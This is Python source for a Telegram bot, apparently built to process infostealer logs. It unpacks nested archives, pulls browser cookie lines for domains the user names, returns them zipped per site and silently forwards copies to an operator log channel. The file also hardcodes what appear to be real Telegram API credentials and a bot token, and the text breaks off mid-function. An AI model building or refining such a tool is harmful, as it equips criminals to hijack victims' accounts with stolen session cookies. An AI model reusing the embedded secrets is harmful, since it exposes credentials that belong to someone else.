#!/usr/bin/env python3
"""
RUTE Cookie Extractor Bot - Pyrofork Version
Enterprise-grade cookie extraction bot with queue management
"""

import os
import sys
import re
import zipfile
import shutil
import hashlib
import time
import random
import string
import subprocess
import asyncio
import psutil
import platform
import signal
import tempfile
import humanize
from datetime import datetime, timedelta
from typing import List, Set, Dict, Optional, Tuple, Any
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import queue
import uuid
import math
import gc
import traceback
from pathlib import Path

# Pyrofork imports
from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait, RPCError
from pyrogram.handlers import MessageHandler, CallbackQueryHandler
from pyrogram.enums import ParseMode

# Third-party imports
try:
    from tqdm import tqdm
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)
except ImportError:
    os.system("pip install -q tqdm colorama humanize psutil")
    from tqdm import tqdm
    import colorama
    from colorama import Fore, Style
    import humanize
    import psutil
    colorama.init(autoreset=True)

# Archive handling libraries
try:
    import rarfile
    HAS_RARFILE = True
except ImportError:
    HAS_RARFILE = False
    try:
        os.system("pip install -q rarfile")
        import rarfile
        HAS_RARFILE = True
    except:
        HAS_RARFILE = False

try:
    import py7zr
    HAS_PY7ZR = True
except ImportError:
    HAS_PY7ZR = False
    try:
        os.system("pip install -q py7zr")
        import py7zr
        HAS_PY7ZR = True
    except:
        HAS_PY7ZR = False

# ==============================================================================
#                            CONFIGURATION
# ==============================================================================

API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
BOT_TOKEN = "8315539700:AAH3NGnaLNQeeV6-2wNJsDFmGPjXInU2YeY"
LOG_CHANNEL = -1003747061396
SEND_LOGS = True
ADMINS = [7125341830]

# ULTIMATE SPEED SETTINGS
MAX_WORKERS = 100
BUFFER_SIZE = 20 * 1024 * 1024  # 20MB buffer
CHUNK_SIZE = 1024 * 1024  # 1MB chunks
MAX_FILE_SIZE = 4 * 1024 * 1024 * 1024  # 4GB
DOWNLOAD_TIMEOUT = 3600  # 1 hour

SUPPORTED_ARCHIVES = {'.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz'}
COOKIE_FOLDERS = {'Cookies', 'Browsers'}

# Detect system
SYSTEM = platform.system().lower()

# ==============================================================================
#                            TOOL DETECTION
# ==============================================================================

class ToolDetector:
    """Detect available external tools"""
    
    @staticmethod
    def check_unrar() -> bool:
        """Check if unrar is available"""
        try:
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\WinRAR\\UnRAR.exe',
                    'C:\\Program Files (x86)\\WinRAR\\UnRAR.exe',
                    'unrar.exe'
                ]
                for path in paths:
                    if os.path.exists(path):
                        return True
                result = subprocess.run(['unrar'], capture_output=True, shell=True)
                return result.returncode != 127
            else:
                result = subprocess.run(['which', 'unrar'], capture_output=True, text=True)
                return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def check_7z() -> bool:
        """Check if 7z is available"""
        try:
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\7-Zip\\7z.exe',
                    'C:\\Program Files (x86)\\7-Zip\\7z.exe',
                    '7z.exe'
                ]
                for path in paths:
                    if os.path.exists(path):
                        return True
                result = subprocess.run(['7z'], capture_output=True, shell=True)
                return result.returncode != 127
            else:
                result = subprocess.run(['which', '7z'], capture_output=True, text=True)
                if result.returncode != 0:
                    result = subprocess.run(['which', '7zz'], capture_output=True, text=True)
                return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def get_tool_path(tool_name: str) -> Optional[str]:
        """Get full path to tool"""
        if tool_name == 'unrar':
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\WinRAR\\UnRAR.exe',
                    'C:\\Program Files (x86)\\WinRAR\\UnRAR.exe',
                ]
                for path in paths:
                    if os.path.exists(path):
                        return path
                return 'unrar.exe'
            else:
                result = subprocess.run(['which', 'unrar'], capture_output=True, text=True)
                return result.stdout.strip() if result.returncode == 0 else 'unrar'
        
        elif tool_name == '7z':
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\7-Zip\\7z.exe',
                    'C:\\Program Files (x86)\\7-Zip\\7z.exe',
                ]
                for path in paths:
                    if os.path.exists(path):
                        return path
                return '7z.exe'
            else:
                for cmd in ['7z', '7zz']:
                    result = subprocess.run(['which', cmd], capture_output=True, text=True)
                    if result.returncode == 0:
                        return result.stdout.strip()
                return '7z'
        
        return tool_name

# ==============================================================================
#                            TOOL STATUS
# ==============================================================================

TOOL_STATUS = {
    'unrar': ToolDetector.check_unrar(),
    '7z': ToolDetector.check_7z(),
}

TOOL_PATHS = {
    'unrar': ToolDetector.get_tool_path('unrar') if TOOL_STATUS['unrar'] else None,
    '7z': ToolDetector.get_tool_path('7z') if TOOL_STATUS['7z'] else None,
}

# ==============================================================================
#                            UTILITY FUNCTIONS
# ==============================================================================

def format_size(bytes_val: int) -> str:
    """Format bytes to human readable"""
    return humanize.naturalsize(bytes_val, binary=True)

def format_time(seconds: float) -> str:
    """Format seconds to human readable"""
    return str(timedelta(seconds=int(seconds)))

def generate_unique_id() -> str:
    """Generate unique ID for tasks"""
    return str(uuid.uuid4())[:8]

def sanitize_filename(filename: str) -> str:
    """Sanitize filename"""
    return ''.join(c if c.isalnum() or c in '._-' else '_' for c in filename)

def get_file_hash_fast(filepath: str) -> str:
    """Fast file hash"""
    try:
        with open(filepath, 'rb', buffering=BUFFER_SIZE) as f:
            first = f.read(1024)
            f.seek(-1024, 2)
            last = f.read(1024)
            return hashlib.md5(first + last).hexdigest()[:8]
    except:
        return str(os.path.getmtime(filepath))

def delete_folder(folder_path: str) -> bool:
    """Delete folder with multiple attempts"""
    if not os.path.exists(folder_path):
        return True
    
    for _ in range(3):
        try:
            gc.collect()
            shutil.rmtree(folder_path, ignore_errors=True)
            time.sleep(0.5)
            if not os.path.exists(folder_path):
                return True
            
            if SYSTEM == 'windows':
                os.system(f'rmdir /s /q "{folder_path}" 2>nul')
            else:
                os.system(f'rm -rf "{folder_path}"')
            
            time.sleep(0.5)
            if not os.path.exists(folder_path):
                return True
        except:
            continue
    
    return not os.path.exists(folder_path)

# ==============================================================================
#                            PASSWORD DETECTION
# ==============================================================================

class PasswordDetector:
    """Detect if archive is password protected"""
    
    @staticmethod
    def check_rar_protected(archive_path: str) -> bool:
        """Check RAR password protection"""
        if not HAS_RARFILE:
            if TOOL_STATUS['unrar']:
                try:
                    cmd = [TOOL_PATHS['unrar'], 'l', archive_path]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    return 'password' in result.stderr.lower() or 'encrypted' in result.stderr.lower()
                except:
                    pass
            return True
        
        try:
            with rarfile.RarFile(archive_path) as rf:
                return rf.needs_password()
        except:
            return True
    
    @staticmethod
    def check_7z_protected(archive_path: str) -> bool:
        """Check 7z password protection"""
        if not HAS_PY7ZR:
            if TOOL_STATUS['7z']:
                try:
                    cmd = [TOOL_PATHS['7z'], 'l', archive_path]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    return 'Encrypted' in result.stdout or 'Password' in result.stdout
                except:
                    pass
            return True
        
        try:
            with py7zr.SevenZipFile(archive_path, mode='r') as sz:
                return sz.password_protected
        except:
            return True
    
    @staticmethod
    def check_zip_protected(archive_path: str) -> bool:
        """Check ZIP password protection"""
        if TOOL_STATUS['7z']:
            try:
                cmd = [TOOL_PATHS['7z'], 'l', archive_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if 'Encrypted' in result.stdout or 'Password' in result.stdout:
                    return True
            except:
                pass
        
        if TOOL_STATUS['unrar']:
            try:
                cmd = [TOOL_PATHS['unrar'], 'l', archive_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if 'password' in result.stderr.lower() or 'encrypted' in result.stderr.lower():
                    return True
            except:
                pass
        
        try:
            with zipfile.ZipFile(archive_path, 'r') as zf:
                for info in zf.infolist():
                    if info.flag_bits & 0x1:
                        return True
                return False
        except:
            return True

# ==============================================================================
#                            ARCHIVE EXTRACTION
# ==============================================================================

class UltimateArchiveExtractor:
    """Ultimate speed archive extraction"""
    
    def __init__(self, password: Optional[str] = None, progress_callback=None):
        self.password = password
        self.processed_files: Set[str] = set()
        self.lock = threading.Lock()
        self.extracted_count = 0
        self.stop_extraction = False
        self.progress_callback = progress_callback
    
    def extract_7z_with_7z(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract .7z using 7z.exe"""
        try:
            cmd = [TOOL_PATHS['7z'], 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            cmd.append(f'-o{extract_dir}')
            cmd.append(archive_path)
            
            result = subprocess.run(cmd, capture_output=True, timeout=300)
            
            if result.returncode == 0:
                files = []
                for root, _, filenames in os.walk(extract_dir):
                    for f in filenames:
                        rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                        files.append(rel_path)
                return files
            return []
        except:
            return []
    
    def extract_rar_with_unrar(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract .rar using UnRAR.exe"""
        try:
            cmd = [TOOL_PATHS['unrar'], 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            else:
                cmd.append('-p-')
            cmd.append(archive_path)
            cmd.append(extract_dir + ('\\' if SYSTEM == 'windows' else '/'))
            
            result = subprocess.run(cmd, capture_output=True, timeout=300)
            
            if result.returncode == 0:
                files = []
                for root, _, filenames in os.walk(extract_dir):
                    for f in filenames:
                        rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                        files.append(rel_path)
                return files
            return []
        except:
            return []
    
    def extract_zip_fastest(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract .zip using fastest available method"""
        if TOOL_STATUS['7z']:
            try:
                cmd = [TOOL_PATHS['7z'], 'x', '-y']
                if self.password:
                    cmd.append(f'-p{self.password}')
                cmd.append(f'-o{extract_dir}')
                cmd.append(archive_path)
                
                result = subprocess.run(cmd, capture_output=True, timeout=300)
                
                if result.returncode == 0:
                    files = []
                    for root, _, filenames in os.walk(extract_dir):
                        for f in filenames:
                            rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                            files.append(rel_path)
                    return files
            except:
                pass
        
        if TOOL_STATUS['unrar']:
            try:
                cmd = [TOOL_PATHS['unrar'], 'x', '-y']
                if self.password:
                    cmd.append(f'-p{self.password}')
                else:
                    cmd.append('-p-')
                cmd.append(archive_path)
                cmd.append(extract_dir + ('\\' if SYSTEM == 'windows' else '/'))
                
                result = subprocess.run(cmd, capture_output=True, timeout=300)
                
                if result.returncode == 0:
                    files = []
                    for root, _, filenames in os.walk(extract_dir):
                        for f in filenames:
                            rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                            files.append(rel_path)
                    return files
            except:
                pass
        
        try:
            with zipfile.ZipFile(archive_path, 'r') as zf:
                if self.password:
                    zf.extractall(extract_dir, pwd=self.password.encode())
                else:
                    zf.extractall(extract_dir)
                return zf.namelist()
        except:
            return []
    
    def extract_rar_fallback(self, archive_path: str, extract_dir: str) -> List[str]:
        """Fallback RAR extraction"""
        try:
            with rarfile.RarFile(archive_path) as rf:
                if self.password:
                    rf.setpassword(self.password)
                rf.extractall(extract_dir)
                return rf.namelist()
        except:
            return []
    
    def extract_7z_fallback(self, archive_path: str, extract_dir: str) -> List[str]:
        """Fallback 7z extraction"""
        try:
            with py7zr.SevenZipFile(archive_path, mode='r', password=self.password) as sz:
                sz.extractall(extract_dir)
                return sz.getnames()
        except:
            return []
    
    def extract_tar_fast(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract TAR/GZ/BZ2"""
        try:
            import tarfile
            with tarfile.open(archive_path, 'r:*') as tf:
                tf.extractall(extract_dir)
                return tf.getnames()
        except:
            return []
    
    def extract_single(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract a single archive"""
        if self.stop_extraction:
            return []
        
        ext = os.path.splitext(archive_path)[1].lower()
        
        try:
            if ext == '.7z':
                if TOOL_STATUS['7z']:
                    return self.extract_7z_with_7z(archive_path, extract_dir)
                elif HAS_PY7ZR:
                    return self.extract_7z_fallback(archive_path, extract_dir)
            
            elif ext == '.rar':
                if TOOL_STATUS['unrar']:
                    return self.extract_rar_with_unrar(archive_path, extract_dir)
                elif HAS_RARFILE:
                    return self.extract_rar_fallback(archive_path, extract_dir)
            
            elif ext == '.zip':
                return self.extract_zip_fastest(archive_path, extract_dir)
            
            else:
                return self.extract_tar_fast(archive_path, extract_dir)
        
        except:
            pass
        
        return []
    
    def find_archives_fast(self, directory: str) -> List[str]:
        """Find all archives"""
        archives = []
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in SUPPORTED_ARCHIVES:
                        archives.append(os.path.join(root, file))
        except:
            pass
        return archives
    
    def extract_all_nested(self, root_archive: str, base_dir: str, status_msg=None) -> str:
        """Extract all nested archives"""
        current_level = {root_archive}
        level = 0
        total_archives = 1
        
        while current_level and not self.stop_extraction:
            next_level = set()
            level_dir = os.path.join(base_dir, f"L{level}")
            os.makedirs(level_dir, exist_ok=True)
            
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                futures = {}
                for archive in current_level:
                    if archive in self.processed_files or self.stop_extraction:
                        continue
                    
                    archive_name = os.path.splitext(os.path.basename(archive))[0]
                    archive_name = sanitize_filename(archive_name)[:50]
                    extract_subdir = os.path.join(level_dir, archive_name)
                    os.makedirs(extract_subdir, exist_ok=True)
                    
                    future = executor.submit(self.extract_single, archive, extract_subdir)
                    futures[future] = (archive, extract_subdir)
                
                for future in as_completed(futures):
                    if self.stop_extraction:
                        executor.shutdown(wait=False)
                        break
                    
                    archive, extract_subdir = futures[future]
                    try:
                        extracted = future.result(timeout=60)
                        with self.lock:
                            self.processed_files.add(archive)
                            self.extracted_count += 1
                        
                        new_archives = self.find_archives_fast(extract_subdir)
                        next_level.update(new_archives)
                        
                        if self.progress_callback:
                            self.progress_callback(self.extracted_count, total_archives + len(next_level))
                        
                        total_archives += len(new_archives)
                    except:
                        pass
            
            current_level = next_level
            level += 1
        
        return base_dir

# ==============================================================================
#                            COOKIE EXTRACTION
# ==============================================================================

class UltimateCookieExtractor:
    """Ultimate speed cookie extraction"""
    
    def __init__(self, target_sites: List[str], progress_callback=None):
        self.target_sites = [s.strip().lower() for s in target_sites]
        self.site_files: Dict[str, Dict[str, str]] = {site: {} for site in self.target_sites}
        self.global_seen: Set[str] = set()
        self.seen_lock = threading.Lock()
        self.stats_lock = threading.Lock()
        self.total_found = 0
        self.files_processed = 0
        self.used_filenames: Dict[str, Set[str]] = {site: set() for site in self.target_sites}
        self.stop_processing = False
        self.progress_callback = progress_callback
        self.site_patterns = {site: re.compile(re.escape(site).encode()) for site in self.target_sites}
    
    def find_cookie_files(self, extract_dir: str) -> List[Tuple[str, str]]:
        """Find all cookie files"""
        cookie_files = []
        
        def scan_worker(start_dir):
            local_files = []
            try:
                for root, _, files in os.walk(start_dir):
                    if any(folder in root for folder in COOKIE_FOLDERS):
                        for file in files:
                            if file.endswith(('.txt', '.txt.bak')):
                                local_files.append((os.path.join(root, file), file))
            except:
                pass
            return local_files
        
        top_dirs = []
        try:
            for item in os.listdir(extract_dir):
                item_path = os.path.join(extract_dir, item)
                if os.path.isdir(item_path):
                    top_dirs.append(item_path)
        except:
            top_dirs = [extract_dir]
        
        with ThreadPoolExecutor(max_workers=min(20, len(top_dirs) or 1)) as executor:
            futures = [executor.submit(scan_worker, d) for d in (top_dirs or [extract_dir])]
            for future in as_completed(futures):
                cookie_files.extend(future.result())
        
        return cookie_files
    
    def get_unique_filename(self, site: str, orig_name: str) -> str:
        """Generate unique filename"""
        base, ext = os.path.splitext(orig_name)
        
        with self.seen_lock:
            if orig_name not in self.used_filenames[site]:
                self.used_filenames[site].add(orig_name)
                return orig_name
            else:
                random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
                new_name = f"{base}_{random_str}{ext}"
                
                while new_name in self.used_filenames[site]:
                    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
                    new_name = f"{base}_{random_str}{ext}"
                
                self.used_filenames[site].add(new_name)
                return new_name
    
    def process_file(self, file_path: str, orig_name: str, extract_dir: str):
        """Process a single file"""
        if self.stop_processing:
            return
            
        try:
            lines = []
            with open(file_path, 'rb', buffering=BUFFER_SIZE) as f:
                for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                    lines.extend(chunk.split(b'\n'))
            
            file_hash = get_file_hash_fast(file_path)
            site_matches: Dict[str, List[Tuple[int, str]]] = {site: [] for site in self.target_sites}
            
            for line_num, line_bytes in enumerate(lines):
                if not line_bytes or line_bytes.startswith(b'#'):
                    continue
                
                line_lower = line_bytes.lower()
                line_str = line_bytes.decode('utf-8', errors='ignore').rstrip('\n\r')
                
                for site in self.target_sites:
                    if self.site_patterns[site].search(line_lower):
                        unique_id = f"{site}|{file_hash}|{line_num}"
                        
                        with self.seen_lock:
                            if unique_id not in self.global_seen:
                                self.global_seen.add(unique_id)
                                site_matches[site].append((line_num, line_str))
                                with self.stats_lock:
                                    self.total_found += 1
            
            for site, matches in site_matches.items():
                if matches:
                    matches.sort(key=lambda x: x[0])
                    lines_list = [line for _, line in matches]
                    
                    site_dir = os.path.join(extract_dir, "cookies", site)
                    os.makedirs(site_dir, exist_ok=True)
                    
                    unique_name = self.get_unique_filename(site, orig_name)
                    out_path = os.path.join(site_dir, unique_name)
                    
                    with open(out_path, 'w', encoding='utf-8', buffering=BUFFER_SIZE) as f:
                        f.write('\n'.join(lines_list))
                    
                    with self.seen_lock:
                        self.site_files[site][out_path] = unique_name
            
            with self.stats_lock:
                self.files_processed += 1
                if self.progress_callback:
                    self.progress_callback(self.files_processed)
                
        except Exception as e:
            pass
    
    def process_all(self, extract_dir: str):
        """Process all files"""
        cookie_files = self.find_cookie_files(extract_dir)
        
        if not cookie_files:
            return
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            for file_path, orig_name in cookie_files:
                if self.stop_processing:
                    break
                future = executor.submit(self.process_file, file_path, orig_name, extract_dir)
                futures.append(future)
            
            for future in as_completed(futures):
                if self.stop_processing:
                    executor.shutdown(wait=False)
                    break
                future.result()
    
    def create_site_zips(self, extract_dir: str, result_folder: str) -> Dict[str, str]:
        """Create ZIP archives per site"""
        created_zips = {}
        
        for site, files_dict in self.site_files.items():
            if not files_dict:
                continue
            
            timestamp = datetime.now().strftime('%H%M%S')
            zip_name = f"{sanitize_filename(site)}_{timestamp}.zip"
            zip_path = os.path.join(result_folder, zip_name)
            
            try:
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_STORED) as zf:
                    for file_path, unique_name in files_dict.items():
                        if os.path.exists(file_path):
                            zf.write(file_path, unique_name)
                created_zips[site] = zip_path
            except:
                continue
        
        return created_zips

# ==============================================================================
#                            TASK MANAGER
# ==============================================================================

class TaskStatus:
    QUEUED = "queued"
    DOWNLOADING = "downloading"
    EXTRACTING = "extracting"
    PROCESSING = "processing"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"

class DownloadProgress:
    """Track download progress"""
    def __init__(self, total_size: int):
        self.total_size = total_size
        self.downloaded = 0
        self.start_time = time.time()
        self.last_update = time.time()
        self.last_downloaded = 0
        self.lock = threading.Lock()
    
    def update(self, chunk_size: int):
        with self.lock:
            self.downloaded += chunk_size
            self.last_update = time.time()
    
    def get_speed(self) -> float:
        with self.lock:
            elapsed = time.time() - self.last_update
            if elapsed > 0:
                return (self.downloaded - self.last_downloaded) / elapsed
            return 0
    
    def get_eta(self) -> float:
        with self.lock:
            speed = self.get_speed()
            if speed > 0:
                remaining = self.total_size - self.downloaded
                return remaining / speed
            return float('inf')
    
    def get_progress(self) -> float:
        if self.total_size > 0:
            return (self.downloaded / self.total_size) * 100
        return 0

class ProcessingTask:
    """Represents a single processing task"""
    
    def __init__(self, user_id: int, chat_id: int, message_id: int, file_path: str, file_name: str, file_size: int):
        self.task_id = generate_unique_id()
        self.user_id = user_id
        self.chat_id = chat_id
        self.message_id = message_id
        self.file_path = file_path
        self.file_name = file_name
        self.file_size = file_size
        self.status = TaskStatus.QUEUED
        self.created_at = datetime.now()
        self.started_at = None
        self.completed_at = None
        self.password = None
        self.target_sites = []
        self.status_message = None
        self.extract_folder = None
        self.results_folder = None
        self.cancel_requested = False
        self.download_progress = None
        self.current_stage = "Queued"
        self.stage_progress = 0
        self.error_message = None
        self.extractor = None
        self.cookie_extractor = None
    
    @property
    def wait_time(self) -> timedelta:
        if self.started_at:
            return self.started_at - self.created_at
        return datetime.now() - self.created_at
    
    @property
    def processing_time(self) -> timedelta:
        if self.started_at:
            end = self.completed_at or datetime.now()
            return end - self.started_at
        return timedelta(0)
    
    def to_dict(self) -> dict:
        return {
            'task_id': self.task_id,
            'user_id': self.user_id,
            'file_name': self.file_name,
            'file_size': format_size(self.file_size),
            'status': self.status,
            'created_at': self.created_at.strftime('%H:%M:%S'),
            'wait_time': str(self.wait_time).split('.')[0],
            'stage': self.current_stage,
            'progress': self.stage_progress
        }

class TaskManager:
    """Manages all processing tasks"""
    
    def __init__(self, max_concurrent: int = 2):
        self.tasks: Dict[str, ProcessingTask] = {}
        self.user_tasks: Dict[int, str] = {}  # user_id -> task_id
        self.queue = asyncio.Queue()
        self.max_concurrent = max_concurrent
        self.current_tasks: Set[str] = set()
        self.lock = asyncio.Lock()
        self.processing = False
        self.bot = None
    
    async def add_task(self, task: ProcessingTask) -> str:
        """Add task to queue"""
        async with self.lock:
            # Check if user already has a task
            if task.user_id in self.user_tasks:
                existing_id = self.user_tasks[task.user_id]
                existing = self.tasks.get(existing_id)
                if existing and existing.status in [TaskStatus.QUEUED, TaskStatus.DOWNLOADING, 
                                                   TaskStatus.EXTRACTING, TaskStatus.PROCESSING]:
                    raise Exception("You already have an active task. Please wait or cancel it.")
            
            self.tasks[task.task_id] = task
            self.user_tasks[task.user_id] = task.task_id
            await self.queue.put(task.task_id)
            
            if not self.processing:
                asyncio.create_task(self.process_queue())
            
            return task.task_id
    
    async def process_queue(self):
        """Process tasks from queue"""
        self.processing = True
        
        while True:
            try:
                # Check if we can start new tasks
                async with self.lock:
                    available = self.max_concurrent - len(self.current_tasks)
                
                if available > 0:
                    try:
                        task_id = await asyncio.wait_for(self.queue.get(), timeout=1.0)
                    except asyncio.TimeoutError:
                        # Check if queue is empty and no tasks running
                        async with self.lock:
                            if self.queue.empty() and not self.current_tasks:
                                break
                        continue
                    
                    async with self.lock:
                        if task_id in self.tasks:
                            task = self.tasks[task_id]
                            if task.status == TaskStatus.QUEUED and not task.cancel_requested:
                                self.current_tasks.add(task_id)
                                asyncio.create_task(self.process_task(task_id))
                
                await asyncio.sleep(0.5)
                
            except Exception as e:
                print(f"Queue processing error: {e}")
                await asyncio.sleep(1)
        
        self.processing = False
    
    async def process_task(self, task_id: str):
        """Process a single task"""
        task = self.tasks.get(task_id)
        if not task:
            return
        
        try:
            task.status = TaskStatus.DOWNLOADING
            task.started_at = datetime.now()
            await self.update_status_message(task)
            
            # Download file if needed
            if task.file_path.startswith('http') or not os.path.exists(task.file_path):
                await self.download_file(task)
            
            if task.cancel_requested:
                await self.cancel_task(task_id)
                return
            
            # Ask for password if needed
            ext = os.path.splitext(task.file_name)[1].lower()
            is_protected = False
            
            if ext == '.rar':
                is_protected = PasswordDetector.check_rar_protected(task.file_path)
            elif ext == '.7z':
                is_protected = PasswordDetector.check_7z_protected(task.file_path)
            elif ext == '.zip':
                is_protected = PasswordDetector.check_zip_protected(task.file_path)
            
            if is_protected and not task.password:
                # Send password request
                await self.bot.send_message(
                    task.chat_id,
                    f"🔐 Archive is password protected.\nPlease send the password or /cancel to abort:",
                    reply_to_message_id=task.message_id
                )
                
                # Wait for password (handled by message handler)
                task.status = "waiting_password"
                await self.update_status_message(task)
                
                # Wait for up to 5 minutes
                for _ in range(300):
                    if task.password is not None or task.cancel_requested:
                        break
                    await asyncio.sleep(1)
                
                if task.cancel_requested:
                    await self.cancel_task(task_id)
                    return
                
                if not task.password:
                    task.error_message = "Password timeout"
                    task.status = TaskStatus.FAILED
                    await self.update_status_message(task)
                    await self.cleanup_task(task)
                    return
            
            # Ask for target sites
            if not task.target_sites and not task.cancel_requested:
                await self.bot.send_message(
                    task.chat_id,
                    f"🎯 Enter domains to filter (comma-separated):",
                    reply_to_message_id=task.message_id
                )
                
                task.status = "waiting_domains"
                await self.update_status_message(task)
                
                # Wait for domains
                for _ in range(300):
                    if task.target_sites or task.cancel_requested:
                        break
                    await asyncio.sleep(1)
                
                if task.cancel_requested:
                    await self.cancel_task(task_id)
                    return
                
                if not task.target_sites:
                    task.error_message = "Domains timeout"
                    task.status = TaskStatus.FAILED
                    await self.update_status_message(task)
                    await self.cleanup_task(task)
                    return
            
            if task.cancel_requested:
                await self.cancel_task(task_id)
                return
            
            # Process the archive
            await self.process_archive(task)
            
        except Exception as e:
            task.status = TaskStatus.FAILED
            task.error_message = str(e)
            await self.update_status_message(task)
            print(f"Task {task_id} failed: {traceback.format_exc()}")
        finally:
            # Remove from current tasks
            async with self.lock:
                self.current_tasks.discard(task_id)
    
    async def download_file(self, task: ProcessingTask):
        """Download file from Telegram"""
        try:
            # Get message
            msg = await self.bot.get_messages(task.chat_id, task.message_id)
            if not msg or not msg.document:
                raise Exception("File not found")
            
            # Check file size
            if msg.document.file_size > MAX_FILE_SIZE:
                raise Exception(f"File too large. Max size: {format_size(MAX_FILE_SIZE)}")
            
            # Update status
            task.status = TaskStatus.DOWNLOADING
            task.current_stage = "Downloading"
            task.download_progress = DownloadProgress(msg.document.file_size)
            await self.update_status_message(task)
            
            # Download with progress
            async def progress(current, total):
                if task.cancel_requested:
                    raise Exception("Download cancelled")
                
                task.download_progress.update(current - task.download_progress.downloaded)
                task.stage_progress = (current / total) * 100
                await self.update_status_message(task)
            
            file_path = await msg.download(
                file_name=os.path.join("downloads", f"{task.task_id}_{task.file_name}"),
                progress=progress
            )
            
            task.file_path = file_path
            
        except Exception as e:
            task.error_message = f"Download failed: {str(e)}"
            task.status = TaskStatus.FAILED
            await self.update_status_message(task)
            raise
    
    async def process_archive(self, task: ProcessingTask):
        """Process the archive"""
        try:
            # Create working directories
            base_dir = os.path.join("temp", task.task_id)
            extract_dir = os.path.join(base_dir, "extracted")
            results_dir = os.path.join(base_dir, "results")
            os.makedirs(extract_dir, exist_ok=True)
            os.makedirs(results_dir, exist_ok=True)
            
            task.extract_folder = extract_dir
            task.results_folder = results_dir
            
            # Extract
            task.status = TaskStatus.EXTRACTING
            task.current_stage = "Extracting"
            task.stage_progress = 0
            await self.update_status_message(task)
            
            def extract_progress(current, total):
                if task.cancel_requested:
                    raise Exception("Extraction cancelled")
                task.stage_progress = (current / total) * 100
                asyncio.create_task(self.update_status_message(task))
            
            extractor = UltimateArchiveExtractor(
                password=task.password,
                progress_callback=extract_progress
            )
            task.extractor = extractor
            
            # Run extraction in thread pool
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(
                None,
                lambda: extractor.extract_all_nested(task.file_path, extract_dir)
            )
            
            if task.cancel_requested:
                raise Exception("Task cancelled")
            
            # Process cookies
            task.status = TaskStatus.PROCESSING
            task.current_stage = "Filtering Cookies"
            task.stage_progress = 0
            await self.update_status_message(task)
            
            def process_progress(processed):
                if task.cancel_requested:
                    raise Exception("Processing cancelled")
                task.stage_progress = min(processed / 100 * 100, 99)  # Cap at 99%
                asyncio.create_task(self.update_status_message(task))
            
            cookie_extractor = UltimateCookieExtractor(
                task.target_sites,
                progress_callback=process_progress
            )
            task.cookie_extractor = cookie_extractor
            
            await loop.run_in_executor(
                None,
                lambda: cookie_extractor.process_all(extract_dir)
            )
            
            if task.cancel_requested:
                raise Exception("Task cancelled")
            
            # Create ZIPs
            if cookie_extractor.total_found > 0:
                task.current_stage = "Creating ZIPs"
                task.stage_progress = 50
                await self.update_status_message(task)
                
                created_zips = await loop.run_in_executor(
                    None,
                    lambda: cookie_extractor.create_site_zips(extract_dir, results_dir)
                )
                
                # Send results
                for site, zip_path in created_zips.items():
                    if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
                        await self.bot.send_document(
                            task.chat_id,
                            zip_path,
                            caption=f"📦 Cookies for: {site}\nEntries: {len(cookie_extractor.site_files[site])}",
                            reply_to_message_id=task.message_id
                        )
                        
                        # Forward to log channel
                        if SEND_LOGS and LOG_CHANNEL:
                            try:
                                await self.bot.send_document(
                                    LOG_CHANNEL,
                                    zip_path,
                                    caption=f"User: {task.user_id}\nFile: {task.file_name}\nSite: {site}"
                                )
                            except:
                                pass
                
                task.stage_progress = 100
                task.status = TaskStatus.COMPLETED
            else:
                task.status = TaskStatus.COMPLETED
                await self.bot.send_message(
                    task.chat_id,
                    "❌ No matching cookies found in the archive.",
                    reply_to_message_id=task.message_id
                )
            
            task.completed_at = datetime.now()
            await self.update_status_message(task)
            
        except Exception as e:
            task.status = TaskStatus.FAILED
            task.error_message = str(e)
            await self.update_status_message(task)
            raise
        finally:
            # Cleanup
            await self.cleanup_task(task)
    
    async def update_status_message(self, task: ProcessingTask):
        """Update the status message"""
        try:
            if task.cancel_requested:
                return
            
            status_text = f"**Task: {task.task_id}**\n"
            status_text += f"📁 File: `{task.file_name}`\n"
            status_text += f"📊 Size: {format_size(task.file_size)}\n"
            status_text += f"⏱️ Status: **{task.status.upper()}**\n"
            
            if task.status == TaskStatus.DOWNLOADING and task.download_progress:
                speed = task.download_progress.get_speed()
                eta = task.download_progress.get_eta()
                progress = task.download_progress.get_progress()
                
                status_text += f"📥 Downloaded: {format_size(task.download_progress.downloaded)}/{format_size(task.download_progress.total_size)}\n"
